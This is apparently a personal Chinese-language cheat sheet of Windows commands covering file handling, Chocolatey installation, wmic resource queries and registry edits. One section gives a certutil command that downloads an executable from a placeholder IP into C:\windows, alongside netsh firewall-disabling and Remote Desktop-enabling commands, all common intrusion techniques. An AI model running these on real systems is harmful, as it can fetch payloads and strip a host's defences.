Windows随记

2021-06-10 Windows 369 字
随记
命令 说明
netstat -r 列出当前路由信息
dir 显示文件列表，同linux下ls
mkdir或mk 创建目录
rmdir或rd 删除目录
copy 复制，需要指定目录
del 删除
touch 创建文件
ren 重命名
type 查看文本文件

文件查找

dir C:\2019* /s /b 		# 查找2019开头文件

choco安装

检查

Get-ExecutionPolicy

如果返回的是 Restricted，那么需要更改为Bypass或AllSigned

修改

Set-ExecutionPolicy AllSigned
或
Set-ExecutionPolicy Bypass -Scope Process

安装

Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

修改安装路径

打开注册表regedit

修改

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion

中的ProgramFilesDir和ProgramFilesDir (x86)的值为指定路径

查看cpu及内存使用

1、查看内存占用情况
wmic OS get FreePhysicalMemory

2、查看系统内存总数
wmic ComputerSystem get TotalPhysicalMemory

3、查看CPU占用情况
wmic cpu get loadpercentage

powershell位置

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

远程下载命令

certutil -urlcache -split -f http://x.x.x.x/x.exe C:\windows\x.exe		# win7+使用，不加指定目录默认为当前目录
# 命令本身是用来添加证书、校验文件的，也可加解密

certutil -encode a.txt b.txt		# 将a base64编码为b.txt
certutil -decode b.txt c.txt		# 将b base64解码（还原）为c.txt

cmd开关防火墙

开启防火墙：

netsh firewall set opmode mode=enable

关闭防火墙：

netsh firewall set opmode mode=disable

开启远程桌面

reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /F 

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDenyTSConnections /t REG_DWORD /d 0
